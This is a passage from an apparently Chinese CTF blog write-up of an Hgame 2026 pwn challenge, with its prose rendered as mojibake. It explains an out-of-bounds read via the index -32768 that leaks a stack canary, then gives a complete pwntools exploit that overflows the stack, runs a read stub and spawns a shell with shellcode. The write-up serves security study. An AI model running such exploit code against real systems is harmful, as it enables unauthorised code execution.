n199;</span><br><span class="line">  LODWORD(n199) = (<span class="type">unsigned</span> __int16)n199;</span><br><span class="line">  <span class="keyword">if</span> ( (__int16)n199 &lt;= <span class="number">199</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    n199 = dis[n199_1];</span><br><span class="line">    <span class="keyword">if</span> ( n199 )</span><br><span class="line">      LODWORD(n199) = <span class="built_in">printf</span>(<span class="string">&quot;: %lu\n&quot;</span>, dis[n199_1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n199;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å¾—å‡ºæ¥ï¼Œshowè¿™é‡Œä¼šåˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„æ•°å­—æ˜¯å¦æ˜¯&gt;0çš„ï¼Œå°±æ˜¯åšä¸€ä¸ªæ— ç¬¦å·æ•°çš„è£…æ¬¢ã€‚è¿™ä¸ªæ—¶å€™æ¼æ´å°±å‡ºç°äº†ã€‚å› ä¸ºè¿™é‡Œæ˜¯%hdå°±æ˜¯32ä½çš„ã€‚æ‰€ä»¥intçš„èŒƒå›´åœ¨-32768~32767ä¹‹é—´ã€‚å¦‚æœæˆ‘ä»¬è¾“å…¥-32768ã€‚ç»è¿‡ä¸€ç³»åˆ—æ“ä½œä»¥åï¼Œå¯ä»¥å‘ç°è¿™é‡Œ-32768æ˜¯ä¸å˜çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¶Šç•Œè®¿é—®åˆ°dis[-32768]å¤„çš„æ•°æ®ã€‚disçš„åœ°å€æ˜¯0x44060ï¼Œè€Œdisæ˜¯æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè®¿é—®åˆ°0x44060-hex(32768*8) &#x3D; 0x44060 - 0x40000 &#x3D; 0x4060ã€‚å¯ä»¥çœ‹å‡ºè¿™é‡Œçš„ä½ç½®åˆšåˆšå¥½æ˜¯å­˜æ”¾çš„canaryã€‚æ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±èƒ½æ³„éœ²å‡ºcanaryã€‚çœŸæ˜¯å¤ªå·§å¦™äº†ã€‚</p>
<p>ç„¶åé•¿åº¦å—é™çš„shellcodeè¯¥æ€ä¹ˆè§£å†³å‘¢ï¼Ÿå½“ç„¶æ˜¯å…ˆæ„é€ readå‡½æ•°ï¼Œç„¶åå†å†™å…¥è¶³é•¿çš„shellcodeå•¦ã€‚æœ€åjmpåˆ°rsiï¼Œä¹Ÿå°±æ˜¯rspçš„ä½ç½®ã€‚è‡³æ­¤è‰ºæœ¯å·²æˆï¼ohyeahã€‚</p>
<p>ä¸‹é¢ç»™å‡ºexpã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;local-2.hgame.vidar.club&#x27;</span>,<span class="number">32186</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-32768&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">15</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rsp = canary + <span class="number">0x20</span></span><br><span class="line">success(<span class="built_in">hex</span>(rsp))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shell_read = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x64</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">success(<span class="built_in">len</span>(shell_read))</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3fa</span>-<span class="number">0x10</span>) + p64(canary) + shell_read + p64(canary+<span class="number">0x410</span>) </span><br><span class="line">success(<span class="built_in">len</span>(pl))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">pl2 = shellcode</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¤šåŠ äº†ä¸ªnopæ˜¯ä¸ºäº†ä¿è¯16å­—èŠ‚å¯¹é½ã€‚</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2026/02/07/Hgame2026/">http://example.com/2026/02/07/Hgame2026/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="http://example.com" target="_blank">X1z1çš„ä¸ªäººåšå®¢</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">PWN from zero to one .æœ‰é—®é¢˜ä¹‹å¤„ï¼Œæœ›å¤šæµ·æ¶µã€‚</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Unlink-attack/" title="Unlink_attack">Unlink_attack</a><time datetime="2026-02-19T14:27:22.000Z" title="å‘è¡¨äº 2026-02-19 22:27:22">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Double-free/" title="Double_free">Double_free</a><time datetime="2026-02-19T14:26:27.000Z" title="å‘è¡¨äº 2026-02-19 22:26:27">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/Unsorted-bin-attack/" title="Unsorted_bin_attack">Unsorted_bin_attack</a><time datetime="2026-02-19T14:24:57.000Z" title="å‘è¡¨äº 2026-02-19 22:24:57">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/off-by-one/" title="off_by_one">off_by_one</a><time datetime="2026-02-19T14:23:51.000Z" title="å‘è¡¨äº 2026-02-19 22:23:51">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/19/UAF/" title="UAF">UAF</a><time datetime="2026-02-19T14:22:29.000Z" title="å‘è¡¨äº 2026-02-19 22:22:29">2026-02-19</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>åˆ†ç±»</span>
            
          </div>
          <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">6</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">10</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><span class="card-category-list-name">æ•°æ®ç»“æ„</span><span class="card-category-list-count">1</span></a></li>
          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>æ ‡ç­¾</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.1em; color: #999">pwn</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.5em; color: #99a9bf">pwnå…¥é—¨</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwnè¿›é˜¶</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.23em; color: #999ea6">Cè¯­è¨€</a></div></div><div class="card-widget card-archives">
    <div class="item-headline">
      <i class="fas fa-archive"></i>
      <span>å½’æ¡£</span>
      
    </div>
  
    <ul class="card-archive-list">
      
        <li class="card-archive-list-item">
          <a class="card-archive-list-link" href="/archives/2026/02/">
            <span class="card-archive-list-date">
              äºŒæœˆ 2026
            </span>
            <span class="card-archive-list-count">7</span>
          </a>
        </li>
      
        <li class="card-archive-list-item">
          <a class="card-archive-list-link" href="/archives/2026/01/">
            <span class="card-archive-list-date">
              ä¸€æœˆ 2026
            </span>
            <span class="card-archive-list-count">2</span>
          </a>
        </li>
      
        <li class="card-archive-list-item">
          <a class="card-archive-list-link" href="/archives/2025/12/">
            <span class="card-archive-list-date">
              åäºŒæœˆ 2025
            </span>
            <span class="card-archive-list-count">6</span>
          </a>
        </li>
      
        <li class="card-archive-list-item">
          <a class="card-archive-list-link" href="/archives/2025/11/">
            <span class="card-archive-list-date">
              åä¸€æœˆ 2025
            </span>
            <span class="card-archive-list-count">3</span>
          </a>
        </li>
      
    </ul>
  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>ç½‘ç«™ä¿¡æ¯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">æ–‡ç« æ•°ç›® :</div><div class="item-count">18</div></div><div class="webinfo-item"><div class="item-name">æœ¬ç«™è®¿å®¢æ•° :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ¬ç«™æ€»æµè§ˆé‡ :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ€åæ›´æ–°æ—¶é—´ :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-02-20T15:30:37.455Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åŠ è½½ä¸­</span></div><div class="local-search-input"><input placeholder="æœç´¢æ–‡ç« ..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>